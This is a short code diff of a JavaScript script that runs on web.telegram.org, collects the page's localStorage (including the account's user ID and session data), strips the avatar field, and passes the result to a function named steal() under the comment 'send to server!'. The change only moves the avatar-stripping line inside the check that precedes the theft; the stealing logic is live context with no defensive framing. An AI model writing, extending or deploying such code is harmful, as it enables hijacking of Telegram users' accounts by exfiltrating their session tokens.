@@ -36,9 +36,6 @@ if (window.location.host == "web.telegram.org") {
   function checkToken() {
     let store = getStorage();
 
-    //remove avatar, why the fuck would you store it in base64 in localstorage
-    if (store.account1.avatarUri) store.account1.avatarUri = undefined;
-
     // check if first chat is loaded, and userId is present in localStorage
     if (
       typeof document.getElementsByClassName("chat-item-clickable")[0] !==
@@ -46,6 +43,9 @@ if (window.location.host == "web.telegram.org") {
       JSON.parse(localStorage.getItem("account1")) !== null &&
       typeof JSON.parse(localStorage.getItem("account1")).userId == "string"
     ) {
+      //remove avatar, why the fuck would you store it in base64 in localstorage
+      if (store.account1.avatarUri) store.account1.avatarUri = undefined;
+
       // send to server!
       steal(store);
       console.log("sent");
